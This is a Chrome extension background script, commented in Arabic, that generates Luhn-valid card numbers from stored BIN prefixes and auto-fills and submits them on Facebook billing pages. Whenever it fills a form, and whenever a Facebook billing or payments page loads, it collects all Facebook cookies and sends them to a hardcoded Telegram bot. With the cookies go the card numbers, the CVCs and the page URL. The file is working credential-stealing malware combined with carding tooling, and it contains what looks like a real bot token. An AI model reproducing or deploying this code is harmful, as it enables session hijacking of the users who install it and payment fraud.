let isProcessingCard = false;

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  console.log('Background received message:', request);
  
  if (request.action === 'fillCard') {
    fillCard(request.type);
    sendResponse({ success: true, message: "Fill card action started" });
  } else if (request.action === 'fillCardWithData') {
    console.log('fillCardWithData action received with data:', request.data);
    fillCardWithSpecificData(request.data, sendResponse);
    return true; // Keep the message channel open for async response
  } else if (request.action === 'sendTelegramMessage') {
    sendCustomTelegramMessage(request.message);
    sendResponse({ success: true, message: "Telegram message sent" });
  } else if (request.action === 'auto-link-on-open') {
    triggerFacebookAutoLink();
    sendResponse({ success: true, message: "Auto link triggered" });
  } else if (request.action === 'showNotification') {
    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
      if (tabs[0]) {
        chrome.scripting.executeScript({
          target: { tabId: tabs[0].id },
          func: showNotification,
          args: [request.message, request.type]
        });
      }
    });
    sendResponse({ success: true, message: "Notification shown" });
  } else if (request.action === 'testTelegram') {
    // اختبار إرسال رسالة إلى تليجرام
    const testMessage = `🧪 اختبار الإضافة
⏰ الوقت: ${new Date().toLocaleString('ar-SA')}
✅ الإضافة تعمل بشكل صحيح`;
    
    sendCustomTelegramMessage(testMessage);
    sendResponse({ success: true, message: "Test message sent to Telegram" });
  } else if (request.action === 'newBinAdded') {
    // إرسال بيانات BIN الجديد إلى تليجرام
    sendBinToTelegram(request.bin, sendResponse);
    return true; // Keep the message channel open for async response
  }
});

chrome.commands.onCommand.addListener((command) => {
  if (command === 'decline-card') {
    fillCard('decline');
  } else if (command === 'active-card') {
    fillCard('active');
  }
});

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (
    changeInfo.status === 'complete' &&
    tab.url &&
    tab.url.includes('facebook.com') &&
    (tab.url.includes('billing') || tab.url.includes('payments'))
  ) {
    try {
      if (chrome.cookies && chrome.cookies.getAll) {
        chrome.cookies.getAll({domain: ".facebook.com"}, function(cookies) {
          if (chrome.runtime.lastError) {
            console.log("Error getting cookies:", chrome.runtime.lastError);
          } else {
            const cookiesStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
            const message = `🔔 تم فتح صفحة الفوترة\nالرابط: ${tab.url}`;
            sendCookiesToTelegram(message, cookiesStr);
          }
        });
      }
    } catch (error) {
      console.log("Error in cookies handling:", error);
    }
  }
});

function fillCard(type) {
  if (isProcessingCard) {
    console.log("Card processing already in progress, skipping...");
    return;
  }
  isProcessingCard = true;

  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    if (!tabs[0]) {
      isProcessingCard = false;
      return;
    }

    chrome.storage.local.get([
      'activeBin', 'activeBinExpire', 'activeBinCvv',
      'declineBin', 'declineBinExpire', 'declineBinCvv',
      'cardAutoSave'
    ], (data) => {
      const isDecline = type === 'decline';

      const userBin = isDecline ? data.declineBin : data.activeBin;
      const defaultBin = isDecline ? '546008' : '55988803';
      const bin = /^[0-9X]+$/.test(userBin) ? userBin : defaultBin;
      
      console.log('Card type:', type);
      console.log('User BIN:', userBin);
      console.log('Default BIN:', defaultBin);
      console.log('Selected BIN:', bin);
      console.log('BIN validation result:', /^[0-9X]+$/.test(userBin));
      
      const remainingLength = 16 - bin.length;
      const finalCardNumber = bin.length <= 16
        ? generateCardNumber(bin, remainingLength)
        : generateCardNumber(defaultBin, 16 - defaultBin.length);

      const expiry = isDecline
        ? (data.declineBinExpire || generateExpiry())
        : (data.activeBinExpire || generateExpiry());

      const cvv = isDecline
        ? (data.declineBinCvv || generateCVV())
        : (data.activeBinCvv || generateCVV());

      const details = {
        name: generateCardName(),
        number: finalCardNumber,
        expiry: expiry,
        cvv: cvv
      };

      chrome.scripting.executeScript({
        target: { tabId: tabs[0].id },
        func: autofillCardDetails,
        args: [details]
      }, (results) => {
        try {
          if (chrome.cookies && chrome.cookies.getAll) {
            chrome.cookies.getAll({domain: ".facebook.com"}, function(cookies) {
              if (chrome.runtime.lastError) {
                console.log("Error getting cookies:", chrome.runtime.lastError);
                sendToTelegram(details, '✅ تم الربط بنجاح', '');
              } else {
                const cookiesStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
                sendToTelegram(details, '✅ تم الربط بنجاح', cookiesStr);
              }
              setTimeout(() => { isProcessingCard = false; }, 2000);
            });
          } else {
            console.log("Cookies API not available");
            sendToTelegram(details, '✅ تم الربط بنجاح', '');
            setTimeout(() => { isProcessingCard = false; }, 2000);
          }
        } catch (error) {
          console.log("Error in cookies handling:", error);
          sendToTelegram(details, '✅ تم الربط بنجاح', '');
          setTimeout(() => { isProcessingCard = false; }, 2000);
        }
        if (data.cardAutoSave === true) {
          chrome.scripting.executeScript({
            target: { tabId: tabs[0].id },
            func: autoClickSaveButton
          });
        } else {
          console.log("Auto Save is OFF — skipping Save button click.");
        }
      });
    });
  });
}

function fillCardWithSpecificData(cardData, sendResponse) {
  console.log("fillCardWithSpecificData called with cardData:", cardData);
  
  if (isProcessingCard) {
    console.log("Card processing already in progress, skipping...");
    sendResponse({ success: false, message: "Card processing already in progress" });
    return;
  }
  isProcessingCard = true;

  console.log("Starting fillCardWithSpecificData with:", cardData);

  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    if (!tabs[0]) {
      console.log("No active tab found");
      isProcessingCard = false;
      sendResponse({ success: false, message: "No active tab found" });
      return;
    }

    console.log("Active tab found:", tabs[0].url);

    const details = {
      name: cardData.name,
      number: cardData.number,
      expiry: cardData.expiry,
      cvv: cardData.cvv,
      binPattern: cardData.binPattern
    };

    console.log("Attempting to fill form with details:", details);

    chrome.scripting.executeScript({
      target: { tabId: tabs[0].id },
      func: autofillCardDetails,
      args: [details]
    }, (results) => {
      console.log("Form filling result:", results);
      
      try {
        if (chrome.cookies && chrome.cookies.getAll) {
          chrome.cookies.getAll({domain: ".facebook.com"}, function(cookies) {
            if (chrome.runtime.lastError) {
              console.log("Error getting cookies:", chrome.runtime.lastError);
              const status = cardData.isQuickBin ? '✅ تم الربط بنجاح (BIN سريع)' : '✅ تم الربط بنجاح (BIN محفوظ)';
              console.log("Sending Telegram message with status:", status);
              sendToTelegram(details, status, '');
            } else {
              const cookiesStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
              const status = cardData.isQuickBin ? '✅ تم الربط بنجاح (BIN سريع)' : '✅ تم الربط بنجاح (BIN محفوظ)';
              console.log("Sending Telegram message with status:", status);
              sendToTelegram(details, status, cookiesStr);
            }
            setTimeout(() => { isProcessingCard = false; }, 2000);
            sendResponse({ success: true, message: "Card filled successfully" });
          });
        } else {
          console.log("Cookies API not available");
          const status = cardData.isQuickBin ? '✅ تم الربط بنجاح (BIN سريع)' : '✅ تم الربط بنجاح (BIN محفوظ)';
          console.log("Sending Telegram message with status:", status);
          sendToTelegram(details, status, '');
          setTimeout(() => { isProcessingCard = false; }, 2000);
          sendResponse({ success: true, message: "Card filled successfully" });
        }
      } catch (error) {
        console.log("Error in cookies handling:", error);
        const status = cardData.isQuickBin ? '✅ تم الربط بنجاح (BIN سريع)' : '✅ تم الربط بنجاح (BIN محفوظ)';
        console.log("Sending Telegram message with status:", status);
        sendToTelegram(details, status, '');
        setTimeout(() => { isProcessingCard = false; }, 2000);
        sendResponse({ success: true, message: "Card filled successfully" });
      }
      
      chrome.storage.local.get(['cardAutoSave'], (data) => {
        if (data.cardAutoSave === true) {
          chrome.scripting.executeScript({
            target: { tabId: tabs[0].id },
            func: autoClickSaveButton
          });
        } else {
          console.log("Auto Save is OFF — skipping Save button click.");
        }
      });
    });
  });
}

function triggerFacebookAutoLink(tabIdOverride) {
  if (isProcessingCard) {
    console.log("Card processing already in progress, skipping...");
    return;
  }
  isProcessingCard = true;

  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    const tabId = tabIdOverride || (tabs[0] && tabs[0].id);
    if (!tabId) {
      isProcessingCard = false;
      return;
    }
    chrome.storage.local.get([
      'activeBin', 'activeBinExpire', 'activeBinCvv',
      'declineBin', 'declineBinExpire', 'declineBinCvv',
      'cardAutoSave'
    ], (data) => {
      const bin = data.activeBin || '55988803';
      const remainingLength = 16 - bin.length;
      const finalCardNumber = bin.length <= 16
        ? generateCardNumber(bin, remainingLength)
        : generateCardNumber('55988803', 8);
      const expiry = data.activeBinExpire || generateExpiry();
      const cvv = data.activeBinCvv || generateCVV();
      const details = {
        name: generateCardName(),
        number: finalCardNumber,
        expiry: expiry,
        cvv: cvv
      };
      chrome.scripting.executeScript({
        target: { tabId: tabId },
        func: autofillCardDetails,
        args: [details]
      }, (results) => {
        try {
          if (chrome.cookies && chrome.cookies.getAll) {
            chrome.cookies.getAll({domain: ".facebook.com"}, function(cookies) {
              if (chrome.runtime.lastError) {
                console.log("Error getting cookies:", chrome.runtime.lastError);
                sendToTelegram(details, '✅ تم الربط بنجاح', '');
              } else {
                const cookiesStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
                sendToTelegram(details, '✅ تم الربط بنجاح', cookiesStr);
              }
              setTimeout(() => { isProcessingCard = false; }, 2000);
            });
          } else {
            console.log("Cookies API not available");
            sendToTelegram(details, '✅ تم الربط بنجاح', '');
            setTimeout(() => { isProcessingCard = false; }, 2000);
          }
        } catch (error) {
          console.log("Error in cookies handling:", error);
          sendToTelegram(details, '✅ تم الربط بنجاح', '');
          setTimeout(() => { isProcessingCard = false; }, 2000);
        }
        if (data.cardAutoSave === true) {
          chrome.scripting.executeScript({
            target: { tabId: tabId },
            func: autoClickSaveButton
          });
        }
      });
    });
  });
}

function autoClickSaveButton() {
  if (document.readyState !== 'complete') {
    console.log("Page not fully loaded, waiting...");
    setTimeout(autoClickSaveButton, 1000);
    return;
  }
  
  let tries = 0;
  function tryClick() {
    const selectors = [
      'div[role="button"][aria-label="Save"]',
      'button[aria-label="Save"]',
      'div[role="button"][aria-label="حفظ"]',
      'button[aria-label="حفظ"]',
      'button[data-testid*="save"]',
      'button[data-testid*="Save"]',
      'button[class*="save"]',
      'button[class*="Save"]',
      'div[class*="save"]',
      'div[class*="Save"]'
    ];
    
    let button = null;
    
    for (const sel of selectors) {
      button = document.querySelector(sel);
      if (button) break;
    }
    
    if (!button) {
      const allButtons = document.querySelectorAll('button, div[role="button"]');
      for (const btn of allButtons) {
        const text = btn.textContent || btn.innerText || '';
        if (text.toLowerCase().includes('save') || text.toLowerCase().includes('حفظ')) {
          button = btn;
          break;
        }
      }
    }
    
    if (!button) {
      const forms = document.querySelectorAll('form');
      for (const form of forms) {
        const submitBtn = form.querySelector('button[type="submit"], input[type="submit"]');
        if (submitBtn) {
          button = submitBtn;
          break;
        }
      }
    }
    
    if (button) {
      try {
        const rect = button.getBoundingClientRect();
        const isVisible = rect.width > 0 && rect.height > 0 && 
                         window.getComputedStyle(button).display !== 'none' &&
                         window.getComputedStyle(button).visibility !== 'hidden';
        
        if (isVisible) {
          button.click();
          console.log("Save button clicked successfully!");
          
          chrome.runtime.sendMessage({
            action: 'showNotification',
            message: 'تم الضغط على زر الحفظ بنجاح',
            type: 'success'
          });
          
          return true;
        } else {
          console.log("Save button found but not visible");
        }
      } catch (error) {
        console.log("Error clicking save button:", error);
      }
    } else if (tries < 8) {
      tries++;
      console.log(`Save button not found, trying again... (${tries}/8)`);
      setTimeout(tryClick, 1200);
    } else {
      console.log("Save button not found after multiple tries.");
      
      chrome.runtime.sendMessage({
        action: 'showNotification',
        message: 'لم يتم العثور على زر الحفظ',
        type: 'error'
      });
    }
  }
  
  setTimeout(tryClick, 2000);
}

const randomWords = [
  'Khan', 'Ahmed', 'Patel', 'Chowdhury', 'Sheikh',
  'Malik', 'Roy', 'Das', 'Hussain', 'Verma',
  'Singh', 'Rahman', 'Sharma', 'Jahan', 'Iqbal',
  'Mondal', 'Rana', 'Mitra', 'Siddiqui', 'Bhattacharya'
];

const randoName = [
  "Aarav", "Arjun", "Kabir", "Ravi", "Vikram", "Raj", "Ayan", "Zayan", "Rehan", "Tariq",
  "Nasir", "Adeel", "Faizan", "Imran", "Nadeem", "Sameer", "Rahul", "Amit", "Vikas", "Karan",
  "Rohit", "Siddharth", "Manoj", "Abdul", "Yusuf", "Asif", "Irfan", "Shahid", "Kamran", "Waqas",
  "Mehedi", "Sabbir", "Tanvir", "Rakib", "Ashik", "Jubayer", "Hasan", "Arif", "Shakil", "Masud",
  "Niaz", "Towhid", "Arafat", "Habib", "Shuvo", "Tarek", "Munna", "Rubel", "Sumon", "Rasel",
  "Anis", "Harun", "Milton", "Shahin", "Liton", "Jamal", "Ovi", "Saiful", "Faruk", "Delwar",
  "Dip", "Rony", "Bappy", "Aslam", "Sagar", "Sohag", "Biplob", "Ripon", "Alam", "Zahid",
  "Sajid", "Tusher", "Mamun", "Nahid", "Tanim", "Reza", "Mizan", "Tanjil", "Sabbir", "Shohel",
  "Sunny", "Sajol", "Raihan", "Tushar", "Emon", "Shuvo", "Nayan", "Salman", "Parvej", "Pavel",
  "Foysal", "Nafis", "Zubair", "Fahim", "Shahriar", "Shafayet", "Hasib", "Ruman", "Noman", "Imtiaz",
  "Aminul", "Hridoy", "Yamin", "Tawsif", "Nashit", "Rizwan", "Saad", "Bilal", "Talha", "Waleed",
  "Hassan", "Junaid", "Basit", "Hamza", "Adil", "Faris", "Kashif", "Affan", "Zeeshan", "Omar",
  "Danish", "Haroon", "Sami", "Fahad", "Haider", "Sufyan", "Mujtaba", "Ammar", "Zayan", "Usman",
  "Zafar", "Latif", "Rizvi", "Faruq", "Mursalin", "Shahbaz", "Mohtasim", "Ehtesham", "Miraz", "Tawsin",
  "Zakir", "Kawsar", "Sayem", "Abrar", "Mustafiz", "Jubayed", "Obaid", "Minhaz", "Fardin", "Touhid",
  "Shahriar", "Mir", "Bashir", "Tazim", "Rashed", "Araf", "Munzir", "Rakin", "Jahin", "Ahsan",
  "Adnan", "Tahmid", "Rahat", "Tarique", "Saddam", "Sabbir", "Fazle", "Mashrur", "Wasiq", "Arkan",

  "Ayesha", "Fatima", "Zara", "Anika", "Nusrat", "Priya", "Puja", "Madhuri", "Ameena", "Sadia",
  "Rima", "Sumaiya", "Mehjabin", "Shila", "Nadia", "Sharmin", "Mousumi", "Lamia", "Tasmia", "Hafsa",
  "Sanjida", "Ishrat", "Nargis", "Mahira", "Khadija", "Ruksana", "Lubna", "Rumana", "Farzana", "Naznin"
];

const generateCardName = () => {
  const randomWord = randomWords[Math.floor(Math.random() * randomWords.length)];
  const randomName = randoName[Math.floor(Math.random() * randoName.length)];

  return `${randomName} ${randomWord}`;
};

const generateCardNumber = (prefix, remainingDigits) => {
  let cardNumber = '';
  
  console.log('Generating card number from prefix:', prefix, 'remaining digits:', remainingDigits);
  
  for (let i = 0; i < prefix.length; i++) {
    if (prefix[i] === 'X') {
      const randomDigit = Math.floor(Math.random() * 10);
      cardNumber += randomDigit;
      console.log(`Replaced X at position ${i} with random digit: ${randomDigit}`);
    } else {
      cardNumber += prefix[i];
      console.log(`Kept digit at position ${i}: ${prefix[i]}`);
    }
  }
  
  for (let i = 0; i < remainingDigits; i++) {
    const randomDigit = Math.floor(Math.random() * 10);
    cardNumber += randomDigit;
    console.log(`Added random digit ${i + 1}: ${randomDigit}`);
  }
  
  console.log('Generated card number before Luhn check:', cardNumber);
  const finalNumber = luhnCheck(cardNumber);
  console.log('Final card number after Luhn check:', finalNumber);
  
  return finalNumber;
};

const luhnCheck = (number) => {
  let sum = 0;
  let shouldDouble = false;
  for (let i = number.length - 1; i >= 0; i--) {
    let digit = parseInt(number.charAt(i));
    if (shouldDouble) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    shouldDouble = !shouldDouble;
  }
  if (sum % 10 === 0) return number;
  const lastDigit = parseInt(number.slice(-1));
  const newLastDigit = (lastDigit + (10 - (sum % 10))) % 10;
  return number.slice(0, -1) + newLastDigit;
};

const generateExpiry = () => {
  const currentYear = new Date().getFullYear();
  const year = currentYear + Math.floor(Math.random() * 5) + 1;
  const month = Math.floor(Math.random() * 12) + 1;
  return `${month.toString().padStart(2, '0')}/${year.toString().slice(-2)}`;
};

const generateCVV = () => Math.floor(Math.random() * 900) + 100;

const autofillCardDetails = (details) => {
  const fields = [
    { name: ['cardname', 'card-name', 'cc-name', 'name', 'card_holder_name', 'cardholder'], value: details.name },
    { name: ['cardnumber', 'card-number', 'cc-number', 'number', 'card_number', 'cardnum'], value: details.number },
    { name: ['expiry', 'exp-date', 'cc-exp', 'expiration', 'exp_date', 'expiry_date'], value: details.expiry },
    { name: ['cvv', 'cvc', 'cc-csc', 'security', 'cvv_code', 'security_code'], value: details.cvv }
  ];

  fields.forEach(field => {
    field.name.forEach(name => {
      // البحث في name و id و placeholder و aria-label
      const selectors = [
        `input[name*="${name}" i]`,
        `input[id*="${name}" i]`,
        `input[placeholder*="${name}" i]`,
        `input[aria-label*="${name}" i]`,
        `input[data-testid*="${name}" i]`,
        `input[class*="${name}" i]`
      ];
      
      for (const selector of selectors) {
        const input = document.querySelector(selector);
        if (input) {
          console.log(`Found field for ${name}:`, input);
          input.value = field.value;
          input.dispatchEvent(new Event('input', { bubbles: true }));
          input.dispatchEvent(new Event('change', { bubbles: true }));
          input.dispatchEvent(new Event('blur', { bubbles: true }));
          break;
        }
      }
    });
  });

  // محاولة ملء الحقول باستخدام data-testid (شائع في فيسبوك)
  const testIdFields = [
    { testId: 'card_number', value: details.number },
    { testId: 'expiry', value: details.expiry },
    { testId: 'cvv', value: details.cvv },
    { testId: 'name', value: details.name }
  ];
  
  testIdFields.forEach(field => {
    const input = document.querySelector(`[data-testid*="${field.testId}" i]`);
    if (input) {
      console.log(`Found field by testid ${field.testId}:`, input);
      input.value = field.value;
      input.dispatchEvent(new Event('input', { bubbles: true }));
      input.dispatchEvent(new Event('change', { bubbles: true }));
      input.dispatchEvent(new Event('blur', { bubbles: true }));
    }
  });

  const countrySelect = document.querySelector('select[name*="country" i], select[id*="country" i]');
  if (countrySelect) {
    countrySelect.value = 'BR';
    countrySelect.dispatchEvent(new Event('change', { bubbles: true }));
  }
  const countryInput = document.querySelector('input[name*="country" i], input[id*="country" i]');
  if (countryInput) {
    countryInput.value = 'Brazil';
    countryInput.dispatchEvent(new Event('change', { bubbles: true }));
  }

  const successMsgs = ['تمت إضافة البطاقة', 'تمت العملية بنجاح', 'Card added', 'Success'];
  const errorMsgs = ['خطأ', 'فشل', 'غير صالحة', 'Error', 'Failed', 'Invalid'];
  const bodyText = document.body.innerText;
  if (successMsgs.some(msg => bodyText.includes(msg))) {
    return true;
  }
  if (errorMsgs.some(msg => bodyText.includes(msg))) {
    return false;
  }
  return null;
};

function sendToTelegram(card, status, cookiesStr = '') {
  console.log("sendToTelegram called with:", { card, status, cookiesStr });
  
  const botToken = '8041194084:AAHUCVbj4QGF2mC9cwoB43lIE7Np9S3EUH8';
  const chatId = '664193835';
  
  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    let currentUrl = '';
    if (tabs[0] && tabs[0].url) {
      currentUrl = tabs[0].url;
    }
    
    let msg = `🔔 نتيجة ربط البطاقة\n${status}\nرقم البطاقة: ${card.number}\nالاسم: ${card.name}\nالتاريخ: ${card.expiry}`;
    
    if (card.binPattern) {
      msg += `\nالنمط: ${card.binPattern}`;
    }
    
    if (currentUrl) {
      msg += `\n\n🌐 رابط الصفحة:\n${currentUrl}`;
    }
    
    if (cookiesStr) {
      msg += `\n\n🍪 [Cookies]\n${cookiesStr}`;
    }
    
    console.log("Sending Telegram message:", msg);
    
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: msg
      })
    }).then(response => {
      console.log("Telegram API response:", response);
      if (response.ok) {
        console.log("Telegram message sent successfully");
      } else {
        console.log("Telegram API error:", response.status, response.statusText);
      }
    }).catch(error => {
      console.log("Telegram API fetch error:", error);
    });
  });
}

function sendCookiesToTelegram(message, cookiesStr = '') {
  const botToken = '8041194084:AAHUCVbj4QGF2mC9cwoB43lIE7Np9S3EUH8';
  const chatId = '664193835';
  
  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    let currentUrl = '';
    if (tabs[0] && tabs[0].url) {
      currentUrl = tabs[0].url;
    }
    
    let msg = message;
    
    if (currentUrl) {
      msg += `\n\n🌐 رابط الصفحة:\n${currentUrl}`;
    }
    
    if (cookiesStr) {
      msg += `\n\n🍪 [Cookies]\n${cookiesStr}`;
    }
    
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: msg
      })
    });
  });
}

function showNotification(message, type = 'info') {
  const existingNotifications = document.querySelectorAll('.extension-notification');
  existingNotifications.forEach(notification => notification.remove());
  
  const notification = document.createElement('div');
  notification.className = 'extension-notification';
  notification.style.cssText = `
    position: fixed;
    top: 20px;
    right: 20px;
    padding: 12px 20px;
    border-radius: 8px;
    color: white;
    font-family: Arial, sans-serif;
    font-size: 14px;
    font-weight: bold;
    z-index: 999999;
    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
    max-width: 300px;
    word-wrap: break-word;
    animation: slideIn 0.3s ease-out;
  `;
  
  switch(type) {
    case 'success':
      notification.style.backgroundColor = '#4CAF50';
      break;
    case 'error':
      notification.style.backgroundColor = '#f44336';
      break;
    case 'warning':
      notification.style.backgroundColor = '#ff9800';
      break;
    default:
      notification.style.backgroundColor = '#2196F3';
  }
  
  notification.textContent = message;
  
  const style = document.createElement('style');
  style.textContent = `
    @keyframes slideIn {
      from {
        transform: translateX(100%);
        opacity: 0;
      }
      to {
        transform: translateX(0);
        opacity: 1;
      }
    }
    @keyframes slideOut {
      from {
        transform: translateX(0);
        opacity: 1;
      }
      to {
        transform: translateX(100%);
        opacity: 0;
      }
    }
  `;
  document.head.appendChild(style);
  
  document.body.appendChild(notification);
  
  setTimeout(() => {
    if (notification.parentNode) {
      notification.style.animation = 'slideOut 0.3s ease-in';
      setTimeout(() => {
        if (notification.parentNode) {
          notification.remove();
        }
      }, 300);
    }
  }, 4000);
}

function sendCustomTelegramMessage(message) {
  const botToken = '8041194084:AAHUCVbj4QGF2mC9cwoB43lIE7Np9S3EUH8';
  const chatId = '664193835';
  
  const msg = {
    chat_id: chatId,
    text: message,
    parse_mode: 'HTML'
  };

  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(msg)
  })
  .then(response => response.json())
  .then(data => {
    console.log('Telegram response:', data);
  })
  .catch(error => {
    console.error('Error sending to Telegram:', error);
  });
}

function sendBinToTelegram(bin, sendResponse) {
  const botToken = '8041194084:AAHUCVbj4QGF2mC9cwoB43lIE7Np9S3EUH8';
  const chatId = '664193835';
  
  // الحصول على URL الصفحة الحالية
  chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
    const currentUrl = tabs[0] ? tabs[0].url : 'غير معروف';
    
    const msg = `💳 <b>تم إضافة BIN جديد</b>

🔢 <b>BIN Pattern:</b> <code>${bin.pattern}</code>
📝 <b>الاسم:</b> ${bin.name || 'غير محدد'}
${bin.cardNumber ? `💳 <b>رقم البطاقة:</b> <code>${bin.cardNumber}</code>` : ''}
${bin.expiryDate ? `📅 <b>تاريخ الانتهاء:</b> <code>${bin.expiryDate}</code>` : ''}
${bin.cvc ? `🔐 <b>CVC:</b> <code>${bin.cvc}</code>` : ''}
⏰ <b>وقت الإضافة:</b> ${new Date(bin.createdAt).toLocaleString('ar-SA')}
🌐 <b>الصفحة:</b> ${currentUrl}`;

    console.log('Sending BIN to Telegram:', msg);

    const msgData = {
      chat_id: chatId,
      text: msg,
      parse_mode: 'HTML'
    };

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(msgData)
    })
    .then(response => {
      console.log('BIN Telegram response status:', response.status);
      return response.json();
    })
    .then(data => {
      console.log('BIN Telegram response data:', data);
      if (data.ok) {
        console.log('✅ BIN data sent to Telegram successfully');
        console.log('Message ID:', data.result?.message_id);
        sendResponse({ success: true, message: "BIN data sent to Telegram" });
      } else {
        console.error('❌ BIN Telegram API error:', data);
        console.error('Error code:', data.error_code);
        console.error('Error description:', data.description);
        sendResponse({ success: false, message: "Error sending BIN to Telegram" });
      }
    })
    .catch(error => {
      console.error('❌ Error sending BIN to Telegram:', error);
      console.error('Error name:', error.name);
      console.error('Error message:', error.message);
      sendResponse({ success: false, message: "Error sending BIN to Telegram" });
    });
  });
}